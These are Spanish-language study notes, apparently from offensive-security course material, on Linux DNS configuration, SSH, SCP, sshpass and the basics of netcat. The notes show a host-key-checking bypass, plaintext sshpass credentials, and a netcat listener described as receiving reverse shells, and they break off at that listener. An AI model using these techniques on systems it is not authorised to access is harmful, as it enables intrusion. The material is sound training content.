Si la entrada del dominio no está en la configuración, se utilizará la entrada de búsqueda. Solo puede haber un valor para la entrada de dominio, mientras que la línea de búsqueda puede tener una lista de dominios para resolver automáticamente. Como se resolvió por la entrada de dominio, lo mismo sería cierto en el caso de la línea de entrada de búsqueda. La entrada del dominio tendrá prioridad, por lo que tener ambas líneas es redundante. Si fuera necesario resolver automáticamente múltiples dominios, se debe usar la línea de entrada de búsqueda y eliminar la línea de entrada de dominio. Un ejemplo de esto podría aparecer como el siguiente:

```
kali@kali:~$ cat /etc/resolv.conf
search offensive-security.com kali.org
nameserver 192.168.1.1
```

Dado que la línea de entrada de búsqueda está configurada, como se muestra en la lista anterior, la búsqueda de "tool" primero verificará para identificar si hay un subdominio de herramientas en *ofensive-security.com*. Si no lo encuentra, intentará con la siguiente entrada y buscará en el espacio del dominio raíz de kali.org.

Si intentáramos hacer ping a "herramienta" con la configuración anterior, el resultado devolvería el nombre y la IP asociados con tools.kali.org. No hay un subdominio de "herramientas" en el dominio raíz de *offensive-security.com*

Debemos asegurarnos de que el archivo /etc/resolv.conf vuelva a la configuración predeterminada antes de continuar.

La línea más importante de este archivo es la línea 'nameserver'. Esto define el servidor DNS que se utilizará para todas y cada una de las referencias de dominio externas. Hemos observado que el servidor DNS es *192.168.1.1*. Podemos definir más de un servidor DNS en este archivo de configuración agregando otra línea de entrada del servidor de nombres al archivo con su dirección IP respectiva.

```
kali@kali:~$ cat /etc/resolv.conf
domain offensive-security.com
search offensive-security.com
nameserver 192.168.1.1
nameserver 8.8.8.8
```

Si la primera IP del servidor DNS no logra resolver la IP a un nombre, el conjunto de DNS secundario puede intentar resolver el nombre. Agregar más entradas del servidor de nombres también puede ser útil para resolver recursos internos.

<br />

- */etc/hosts*:

Cuando la necesidad de resolución de nombres no requiere un servidor DNS completo, el archivo */etc/hosts* se puede configurar para administrar las resoluciones de nombres. La siguiente lista muestra la configuración predeterminada del archivo /etc/hosts .

```
kali@kali:~$ cat /etc/hosts
127.0.0.1       localhos
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

La primera columna es la dirección IP y la segunda columna es el nombre que se resolverá en la IP. Notaremos que _localhost_ se proporciona en dos ubicaciones: la sección IPv4 como _127.0.0.1_ y la sección IPv6 como _::1_ .

Se pueden proporcionar más entradas de nombre en la misma línea que la dirección IP. Un ejemplo de agregar 'yo' a la IP 127.0.0.1 es el siguiente:

```
kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost me
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Después de este cambio, si hacemos *ping -c 2 me* , se resuelve en 127.0.0.1.

```
kali@kali:~$ ping -c 2 me
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.055 ms

--- localhost ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1024ms
rtt min/avg/max/mdev = 0.017/0.036/0.055/0.019 ms
```

También se puede agregar una nueva entrada en el mismo formato que las entradas anteriores. Imaginemos que hay un servidor de archivos interno con la IP 10.124.17.10. Para acceder a los archivos en el servidor de archivos más fácilmente, podemos agregar una entrada de hosts de "FileShare".

```
kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost me
127.0.1.1       kali
10.124.17.10    FileShare

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Con la entrada de host agregada, en lugar de escribir la dirección IP en el servidor de archivos, se puede usar la palabra legible por humanos 'FileShare' para acceder a ella.

El orden de resolución de nombres lo gestiona el archivo */etc/nsswitch.conf* (Cambio de servicio de nombres). Analicemos este archivo.

```
kali@kali:~$ cat /etc/nsswitch.conf
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files mdns4_minimal [NOTFOUND=return] dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
```

La primera columna es el servicio y la segunda columna es la forma en que se maneja este servicio. En el caso del servicio de hosts, primero lo manejan los archivos locales, luego mdns4_minimal y finalmente DNS. La entrada *mdns4_minimal* es una resolución de DNS de multidifusión que completará automáticamente las entradas con un TLD *.local*. Si no hay una búsqueda relevante que termine con *.local*, pasará a la búsqueda de DNS normal. Sabiendo esto, el servicio relacionado primero debe hacer referencia al archivo /etc/hosts que cubrimos anteriormente.

Ahora deberíamos poder administrar los problemas de resolución de nombres para configurar en un localhost usando el archivo /etc/hosts . Esto puede hacer que trabajar con servidores de uso común sea mucho más fácil. También deberíamos poder ayudar a resolver los problemas del puntero DNS cuando un host local no puede resolver un nombre.

<br />

**Exercises**

**1. ¿Qué archivo de configuración contiene información del servidor DNS?**

/etc/resolv.conf

<br />

**2. ¿Qué archivo de configuración contiene hosts definidos localmente?**

/etc/hosts

<br />

**3. ¿Qué dirección IP está asociada con el nombre de host "localhost"?**

127.0.0.1

<br />

**4. El archivo /etc/resolv.conf tiene la siguiente configuración:**

```
search offensive-security.ninja
nameserver 1.1.1.1
nameserver 8.8.8.8
```

**¿Cuál es la dirección IP del servidor de nombres principal?**

1.1.1.1

<br />

**5.  El archivo /etc/resolv.conf tiene la siguiente configuración:**

```
search offensive-security.ninja
nameserver 1.1.1.1
nameserver 8.8.8.8
```

**Si se ingresó "https://www" en el navegador, ¿cómo se resolvería la URL? (Proporcione la URL completa, incluido el https://)**

Como no se ha proporcionado un dominio lo que se hace es incorporar automáticamente el dominio de la búsqueda materializado en el campo 'search':

```bash
https://www.offensive-security.ninja
```

<br />

**6.  El archivo /etc/hosts contiene las siguientes entradas:**

```
127.0.0.1       localhos
127.0.1.1       kali
192.168.1.254   gateway1
138.145.23.109  SharedRepo
10.16.18.22     salesDB
```

**¿Qué dirección IP está asociada con "salesDB"?**

10.16.18.22

<br />

**7.  Después de los archivos, ¿en qué base de datos (en su cliente Kali) se busca antes de realizar una consulta de DNS al resolver un nombre de host?**

mdns4_minimal

#### 2.5. SSH, SCP, SSHPASS.

En esta sección, examinaremos algunos clientes Linux comunes, adoptando un enfoque práctico para familiarizarnos con cada cliente. Nuestro primer paso es conectarnos al cliente, lo que significa que debemos cubrir la utilidad *SSH*.

Aprender a acceder de forma remota a otros hosts es una habilidad increíblemente importante para los profesionales de la tecnología de la información. En esta sección, cubriremos cómo acceder de forma segura a los recursos y transferir archivos, así como también examinaremos algunos riesgos con la automatización del proceso.

<br />

- *SSH*

*Secure Shell Protocol* (SSH) es un protocolo criptográfico cliente/servidor para permitir comunicaciones seguras entre dos hosts. La comunicación a través de SSH está cifrada en la red, mientras que *Telnet* en contraste (otra utilidad de cliente similar) no lo está. SSH se usa comúnmente para obtener acceso remoto a otro host para usarlo o administrarlo.

*SSH funciona en el puerto TCP 22* de forma predeterminada. Este protocolo requiere algún tipo de autenticación, normalmente un nombre de *usuario/contraseña* estándar o una clave *pública/privada*. 

Comencemos cubriendo el uso general de *ssh*. Iniciaremos un servidor ssh local en el host Kali. (La salida individual puede parecer ligeramente diferente).

```
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali: 
                
kali@kali:~$ sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: active (running) since Mon 2021-07-12 06:59:17 MST; 8s ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 1327 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 1328 (sshd)
      Tasks: 1 (limit: 4631)
     Memory: 2.0M
        CPU: 19ms
     CGroup: /system.slice/ssh.service
             └─1328 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups

Jul 12 06:59:17 kali systemd[1]: Starting OpenBSD Secure Shell server...
Jul 12 06:59:17 kali sshd[1328]: Server listening on 0.0.0.0 port 22.
Jul 12 06:59:17 kali sshd[1328]: Server listening on :: port 22.
Jul 12 06:59:17 kali systemd[1]: Started OpenBSD Secure Shell server.
```

Con el servicio *ssh* en ejecución, podemos acceder a nuestro host local con nuestro usuario *kali*. Vayamos a nuestro *host local* proporcionando nuestro nombre de usuario seguido de un signo de arroba (@) y el host al que queremos conectarnos.

```
kali@kali:~$ ssh kali@localhos
kali@localhost's password: 
Linux kali 5.10.0-kali8-amd64 #1 SMP Debian 5.10.40-1kali1 (2021-05-31) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 11 08:48:15 2021 from ::1
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
kali@kali:~$ exi
Connection to localhost closed.
```

Aunque la secuencia de comandos de la terminal es la misma (kali@kali:~$ en la terminal), se realizó una conexión SSH al host local independientemente de la primera sesión de la terminal. 

A menudo nos encontraremos con un servidor SSH alojado en un puerto diferente al predeterminado. Para saber cómo cambiar esto, analicemos el archivo de configuración /etc/ssh/sshd_config .

Tenga en cuenta que este no es el archivo /etc/ssh/ssh_config . El archivo /etc/ssh/sshd_config es para el proceso del *daemon* ssh (el proceso del servidor), mientras que el archivo de configuración /etc/ssh/ssh_config es para el cliente ssh.

- /etc/ssh/sshd_config -> Configuración del servidor SSH.
- /etc/ssh/ssh_config -> Configuración del clienete SSH.

Hay muchas otras configuraciones que podemos implementar con el archivo /etc/ssh/sshd_config, incluidos los tipos de cifrado, los archivos de clave, los tipos de autenticación e incluso qué direcciones IP escuchar.

```
kali@kali:~$ cat /etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
...
```

Como se muestra en el resultado, la línea *Port* está comentada de forma predeterminada. Descomentemos esta línea y cambiemos el valor del puerto a *2222*.

```
kali@kali:~$ cat /etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
...
```

Ahora, intentemos acceder al servidor ssh localmente en el puerto predeterminado (puerto 22).

```
kali@kali:~$ ssh kali@localhos
kali@localhost's password: 
Linux kali 5.10.0-kali8-amd64 #1 SMP Debian 5.10.40-1kali1 (2021-05-31) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 12 07:41:14 2021 from ::1
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
kali@kali:~$ exi
Connection to localhost closed.
```

A pesar del cambio en la línea _Puerto_ anterior, el servidor ssh todavía está disponible en el puerto _22_ . Según la nueva configuración, no es así como debería funcionar el servicio. **Este problema ocurrió porque el demonio del servicio ssh no se reinició. Para aplicar los cambios usemos systemctl para reiniciar el servicio ssh ahora.**

```
kali@kali:~$ sudo systemctl restart ssh
```


Con el servicio reiniciado, intentemos acceder de nuevo al servidor ssh local en el puerto predeterminado.

```
kali@kali:~$ ssh kali@localhos
ssh: connect to host localhost port 22: Connection refused
```

Este es el comportamiento esperado para el servidor ssh. El servidor debe estar alojado en el puerto *2222*, así que usemos la opción *-p* para especificar el puerto al que queremos conectarnos.

```
kali@kali:~$ ssh kali@localhost -p 2222
kali@localhost's password: 
Linux kali 5.10.0-kali8-amd64 #1 SMP Debian 5.10.40-1kali1 (2021-05-31) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 12 08:24:29 2021 from ::1
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
kali@kali:~$ exi
Connection to localhost closed.
```

Para la siguiente parte de esta sección ssh, detengamos el servidor ssh en nuestro host. Es una buena práctica detener los servicios que no se utilizan para limitar la superficie de ataque en un host.

```
kali@kali:~$ sudo systemctl stop ssh
```

A pesar de detener el servicio SSH, debemos asegurarnos de que la línea del *Port* se revierta a 22 y se comente. Restaurar esto a la configuración predeterminada nos ayudará a prevenir futuros problemas si necesitamos utilizar SSH en nuestra máquina y olvidarnos de nuestros cambios.

Pasando de nuestro servidor SSH local, ahora analizaremos cómo funcionan las sesiones SSH remotas y otros archivos críticos que se crean como resultado de esas interacciones. Un directorio importante para SSH es el directorio *.ssh*, que se crea en el directorio de inicio de un usuario. Incluso después de los ejercicios con localhost, este directorio no se ha creado. Vamos a buscarlo usando el comando:

```
kali@kali:~$ ls -a -1
.
..
.bash_logou
.bashrc
.bashrc.original
.cache
.config
.dbus
Desktop
Documents
Downloads
.face
.face.icon
.gnupg
.ICEauthority
.java
.local
Music
Pictures
.profile
Public
.sudo_as_admin_successful
Templates
Videos
.vnc
.Xauthority
.zshrc
```

Actualmente, el directorio .ssh no existe en nuestro directorio de inicio.

Hagamos una conexión con el host de ejercicio remoto. En este ejemplo, la IP del host del ejercicio es _192.168.55.61_ .Accederemos a este host en el puerto _2222_ con el nombre de usuario *ofensive* .

```
kali@kali:~$ ssh offensive@192.168.55.61 -p 2222
The authenticity of host '[192.168.55.61]:2222 ([192.168.55.61]:2222)' can't be established.
ED25519 key fingerprint is SHA256:qztGAMsXjffSxLSNetPJoMkzMiacX1h5/7R2kiOM7fA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

La primera vez que se realiza una conexión ssh a un host, el cliente (nuestro host) preguntará si estamos seguros de que deseamos realizar la conexión. Cuando se ingresa 'si', nuestro host almacenará la información para su reutilización.

Ingresar *no* simplemente desconectará el intento de conexión (y no guardará la información). El Listado 48 muestra la respuesta *afirmativa*.

```
kali@kali:~$ ssh offensive@192.168.55.61 -p 2222
The authenticity of host '[192.168.55.61]:2222 ([192.168.55.61]:2222)' can't be established.
ED25519 key fingerprint is SHA256:qztGAMsXjffSxLSNetPJoMkzMiacX1h5/7R2kiOM7fA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.55.61]:2222' (ED25519) to the list of known hosts.
offensive@192.168.55.61's password:
```

Después de ingresar "yes" en la terminal, el servidor SSH nos solicita la contraseña. En lugar de ingresar la contraseña, presionaremos C + c para detener la conexión SSH. Ejecutemos *ls -a -1* en nuestro directorio de inicio y observemos los resultados.

```
kali@kali:~$ ls -a -1
.
..
.bash_logou
.bashrc
.bashrc.original
.cache
.config
.dbus
Desktop
Documents
Downloads
.face
.face.icon
.gnupg
.ICEauthority
.java
.local
Music
Pictures
.profile
Public
.ssh
.sudo_as_admin_successful
Templates
Videos
.vnc
.Xauthority
.zshrc
```

Habiendo establecido la conexión, ahora tenemos un directorio _.ssh_ en nuestro directorio de inicio. Entonces podemos examinar la opción de "huella digital", eliminemos los archivos y este directorio e intentemos volver a conectarnos a través de SSH.

Estamos haciendo esto con fines de demostración. Por lo general, se desaconseja eliminar el directorio .ssh después de que la sesión SSH lo haya creado. Sin embargo, sin eliminar esta ruta y archivo, no podremos demostrar la opción de _huella digital ._

Comencemos eliminando el directorio .ssh .

```
kali@kali:~$ rm -rf ~/.ssh
```

Ahora que se eliminó el directorio .ssh , volvamos a conectarnos al host del ejercicio e ingresemos "huella digital" cuando se le solicite.

```
kali@kali:~$ ssh offensive@192.168.55.61 -p 2222
The authenticity of host '[192.168.55.61]:2222 ([192.168.55.61]:2222)' can't be established.
ED25519 key fingerprint is SHA256:qztGAMsXjffSxLSNetPJoMkzMiacX1h5/7R2kiOM7fA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? fingerprint
Please type 'yes', 'no' or the fingerprint:
```

Cuando ingresamos "huella digital", no se mostró la solicitud de contraseña. Esto se debe a que el indicador solicita la _huella digital de la clave_ que se proporcionó en el indicador de SSH. Copiemos y peguemos la huella digital proporcionada en el mensaje.

```
kali@kali:~$ ssh offensive@192.168.55.61 -p 2222
The authenticity of host '[192.168.55.61]:2222 ([192.168.55.61]:2222)' can't be established.
ED25519 key fingerprint is SHA256:qztGAMsXjffSxLSNetPJoMkzMiacX1h5/7R2kiOM7fA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? fingerprint
Please type 'yes', 'no' or the fingerprint: SHA256:qztGAMsXjffSxLSNetPJoMkzMiacX1h5/7R2kiOM7fA
Warning: Permanently added '[192.168.55.61]:2222' (ED25519) to the list of known hosts.
offensive@192.168.55.61's password:
```

La huella digital provista se basa en la clave pública en el servidor SSH. Tanto "sí" como las entradas de huellas dactilares para este aviso completan el mismo resultado, que es almacenar la información de SSH en un archivo. Si la clave pública en ese host SSH cambia, las claves ya no se alinearán y se mostrará un error en la terminal. Esto ayuda a evitar conexiones a servidores SSH maliciosos después de que se haya establecido la confianza inicial.

Nuevamente, la contraseña no se ingresó y la conexión SSH se cerró con C + c . El directorio .ssh se creó una vez más en nuestro directorio de inicio. Hagamos una lista del contenido de este directorio.

```
kali@kali:~$ ls -a -1 .ssh
.
..
known_hosts
```

Hemos descubierto un archivo llamado hosts_conocidos dentro del directorio ~/.ssh . Este archivo es lo que el mensaje estaba agregando al host kali cuando solicitó la conexión.

Analicemos el contenido de este archivo ingresando **cat .ssh/known_hosts** .

```
kali@kali:~$ cat .ssh/known_hosts
|1|iY/jD14Jy4PlH/JnlO83LMbp+Is=|fpvcQaEIEKt57J0CViVHL48nQ8k= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFlCaq/373mnjw+OIvlLJxpPrRi1iG5BeXf/tCZ7dI/c
```

Los valores en este archivo actualmente están cifrados, por lo que no es posible que entendamos esto sin descifrar la salida. Esto se controla en el archivo de configuración del cliente, /etc/ssh/ssh_config . Examinemos la configuración que controla esto.

```
kali@kali:~/.ssh$ tail /etc/ssh/ssh_config
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
```

Cambiemos el valor de *HashKnownHosts* a 'no', eliminemos el directorio .ssh e intentemos la conexión nuevamente.

El nuevo archivo de configuración debe tener una apariencia similar a la siguiente:

```
kali@kali:~$ tail /etc/ssh/ssh_config
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts no
    GSSAPIAuthentication yes
```

Con la nueva configuración, eliminemos el directorio .ssh .

```
kali@kali:~$ rm -rf .ssh
```

Hagamos la conexión de nuevo, ingrese "sí" y vea el archivo de hosts_conocidos creado . El archivo se muestra a continuación:

```
kali@kali:~$ cat .ssh/known_hosts
[192.168.55.61]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFlCaq/373mnjw+OIvlLJxpPrRi1iG5BeXf/tCZ7dI/c
```

Con el cambio de configuración, la IP y el puerto del servidor SSH se muestran en texto sin formato. La aplicación de hash al archivoknown_hosts puede ser útil, ya que si el host se ve comprometido, un atacante tendría más dificultades para obtener más información sobre los sistemas remotos a los que se accede desde el host.

En la lista anterior, el primer objeto resaltado es el puerto y el destino de la conexión. Si usáramos un nombre legible por humanos ( nombre _canónico_ ), mostraría el nombre resuelto del servidor e incluiría la dirección IP, de manera similar a cuando usamos *traceroute* anteriormente en este tema.

El archivo known_hosts ayuda a evitar escuchas ilegales o un dispositivo no autorizado al contabilizar estos datos junto con el valor hash. A veces, una red interna puede experimentar un cambio en la IP del host que afectará la huella digital del host conocido.

Esto también puede ocurrir en nuestro entorno de laboratorio si se utiliza un servidor diferente con la misma dirección IP. Hay dos formas de eludir el error de que puede estar ocurriendo un ataque. La primera es eliminar el archivoknown_hosts o la entrada a ese servidor en el archivo. La segunda opción es agregar la _opción -o stricthostkeychecking=no_ al comando ssh. Recuerde que este archivo es un mecanismo de seguridad para evitar que un host no autorizado espíe el tráfico de la red. En la práctica del mundo real, este mecanismo no debe pasarse por alto.

El archivo /etc/ssh/ssh_config se modificó para mostrar el archivoknown_hosts en texto sin formato. También puede manejar muchas otras configuraciones de clientes ssh, incluida la configuración de _StrictHostKeyChecking_ . Las demás configuraciones no se tratarán en este tema.

En lugar de cambiar un archivo de configuración global que afecta a todos los usuarios de un sistema, examinemos un archivo que puede ser más relevante para una cuenta de usuario independiente: ~/.ssh/config. Este archivo se lee antes que el archivo /etc/ssh/ssh_config . Es un archivo definido por el usuario para manejar la configuración del cliente para un host, todos los hosts o incluso excluir hosts. Como se trata de un archivo definido por el usuario, no existirá de forma predeterminada.

Vamos a crear este archivo para el ejemplo dado para _192.168.55.61_ .

```
kali@kali:~/.ssh$ ls -al
total 16
drwx------  2 kali kali 4096 Jul 13 03:18 .
drwxr-xr-x 19 kali kali 4096 Jul 13 03:18 ..
-rw-------  1 kali kali   75 Jul 13 03:18 config
-rw-r--r--  1 kali kali  430 Jul 13 03:16 known_hosts

kali@kali:~/.ssh$ cat config
Host lab
        HostName 192.168.55.61
        User offensive
        Port 2222
                  
kali@kali:/.ssh$
```

Ahora que se hizo una entrada para _lab_ en el archivo ~/.ssh/config , estas configuraciones en la configuración ssh se usarán cuando se use el alias *lab*. También es importante tener en cuenta que este archivo debe tener permisos _0600 (-rw-------)_ en él. Ejecutemos el comando ssh contra el alias.

```
kali@kali:~$ ssh lab
offensive@192.168.55.61's password:
```

<br />

- *SCP*

*SSH* también se puede usar para copiar archivos de forma remota a través de una utilidad llamada *SCP (Protocolo de copia segura)*. La sintaxis de **scp** es muy similar a la del comando _cp_ , excepto que la ubicación del archivo contendrá _User_ @ _host_ : _remote-file-path_ . Copiemos el archivo .bashrc del usuario ofensivo con SCP en nuestro directorio de trabajo actual con el nombre "Copiedbashrc".

```
kali@kali:~$ scp offensive@192.168.55.61:/home/offensive/.bashrc Copiedbashrc
offensive@192.168.65.61's password: 
.bashrc                                    100% 3771     1.1MB/s   00:00

kali@kali:~$ ls -1
Copiedbashrc
Desktop
Documents
...
```

*SCP* informa que el archivo se copió con éxito. Tomó menos de 1 segundo ya que esto se hizo localmente usando un archivo muy pequeño.

<br />

- *sshpass*

Finalizaremos la parte ssh de esta sección cubriendo _sshpass_ . Esta utilidad está diseñada para proporcionar la contraseña ssh en la ejecución del comando, en lugar de tener que ingresarla manualmente en el indicador. Esto es útil porque significa que se puede abrir una sesión ssh a través de un script sin requerir la interacción del usuario.

A pesar de la utilidad de esta utilidad, existen graves inconvenientes de seguridad. Los comandos recientes ingresados ​​en el terminal se pueden enumerar con el comando de **historial** , que revelará la contraseña utilizada en texto sin formato. Almacenar un comando sshpass dentro de una secuencia de comandos también revelará la contraseña si se puede leer la secuencia de comandos. Revisemos cómo funciona **sshpass** , incluido cómo instalarlo.

El Listado 62 ilustra el formato requerido. La opción *-p* va seguida de la contraseña.

```
kali@kali:~$ sshpass -p 'security' ssh lab
Command 'sshpass' not found, but can be installed with:
sudo apt install sshpass
Do you want to install it? (N/y)y
sudo apt install sshpass
[sudo] password for kali:
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following package was automatically installed and is no longer required:
  gstreamer1.0-pulseaudio
Use 'sudo apt autoremove' to remove it.
The following NEW packages will be installed:
  sshpass
0 upgraded, 1 newly installed, 0 to remove and 102 not upgraded.
Need to get 13.0 kB of archives.
After this operation, 38.9 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 sshpass amd64 1.09-1+b1 [13.0 kB]
Fetched 13.0 kB in 1s (19.8 kB/s)
Selecting previously unselected package sshpass.
(Reading database ... 328377 files and directories currently installed.)
Preparing to unpack .../sshpass_1.09-1+b1_amd64.deb ...
Unpacking sshpass (1.09-1+b1) ...
Setting up sshpass (1.09-1+b1) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.2.3) ...
```

Cuando intentamos usar el comando, Kali presentó un error de que sshpass no estaba instalado. Convenientemente, en la misma ejecución del comando, podemos instalarlo ingresando **y** . Intentemos ejecutar el comando nuevamente. Debemos tener en cuenta que estamos usando el mismo alias que se configuró en el archivo ~/.ssh/config .

```
kali@kali:~$ sshpass -p 'security' ssh lab
Last login: Fri Jul  8 14:59:46 2022 from 192.168.55.200
[offensive@non-standard-port ~]$
```

La conexión ssh se inició sesión automáticamente con la contraseña proporcionada. Ahora que entendemos sshpass más claramente, exploremos dos razones por las que podríamos optar por no usar esta utilidad en un entorno de producción.

La primera razón se debe al historial de comandos. Si un usuario en un host está comprometido, el comando de **historial** puede mostrar los últimos comandos que ejecutó ese usuario. Esto puede ser utilizado por un atacante para identificar las credenciales de los usuarios, otros sistemas remotos a los que se puede acceder e incluso conducir al control total del sistema mediante la escalada de privilegios. En el tema de _Linux_ de este curso, se encontró el historial de comandos de usuario leyendo el archivo ~/.zsh_history . El comando de **historial** hace lo mismo para el usuario actual. Hagamos una lista de la historia más reciente del usuario de kali.

```
kali@kali:~$ history
...
22  sshpass -p 'security' ssh lab
23 exi
```

En la lista anterior, observaremos la contraseña del alias del host del laboratorio en texto sin formato. Un atacante podría usar esta información para obtener acceso al host remoto.

De manera similar, la segunda razón para ser cauteloso con sshpass es que un atacante podría leer una contraseña en texto sin formato si esta utilidad se usa en un script. Es una mala práctica de seguridad almacenar contraseñas en texto sin formato en cualquier archivo de un sistema, por lo que implementar esto en un script es una mala práctica.

En esta sección, exploramos varios aspectos de _SSH_ . Cubrimos su uso básico, cómo acceder a diferentes puertos, algunas configuraciones menores de servidor y cliente, el archivoknown_hosts y la toma de huellas digitales. También examinamos los problemas con los cambios en la huella digital y cómo eso puede verse afectado en un laboratorio o una configuración de red interna, el archivo de configuración definido por el usuario , la copia de archivos de forma remota y el suministro automático de una contraseña para la autenticación ssh (y las debilidades de seguridad relacionadas).

Habiendo cubierto _SSH_ en detalle, aprovechemos la oportunidad para reforzar lo que aprendimos con algunos ejercicios prácticos.

<br />

#### 2.6. Netcat.

Netcat fue el primer prototipo de herrmienta para pentesters. Es conocida como la navaja suiza y esta es una clara expresión de la amplia variedad de usos que tienen la herramienta. La definición forma es que se trata de una herramienta que permite leer y escribir datos a lo largo de conexiones de red empleando tanto TCP como UDP.

<br />

##### 2.6.1. Conectando a un puerto TCP/UDP.

Netcat como programa puede actuar tanto a modo de cliente como a modo de servidor. 

Como cliente Netcat puede conectarse a cualquier puerto TCP/UDP y permitirnos: verificar si un puerto está abierto o cerrado, leer un banner del servicio en escucha y por último, conectarnos y realizar peticiones manuales a un servicio, por ejemplo HTTP, FTP, etc.

```bash
kali@kali:~$ nc -nv 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
qui
+OK POP3 server lab signing off.
```

En el ejemplo anterior podemos ver cómo nos conectamos a un servidor POP3 (puerto 110) y seguidamente introducimos comandos manualmente para realizar una petición de logeo al servidor.

<br />

##### 2.6.2. Escuchando en un puerto TCP/UDP.

Con Netcat también podemos abrir un puerto para recibir una petición, esto suele ser francamente útil a la hora de recibir un fichero, una conexión de shell (reverse shell) o para debuggear una aplicación.

Para actuvar esta característica empleamos el flag '-lp', el '-l' es para escuchar, el '-p' para especificar el puerto además también podemos añadir el '-nv' para indicar sólo IPs numéricas (no dominios) y que verbaliza el resultado.

```bash
C:\Users\offsec> nc -nlvp 4444
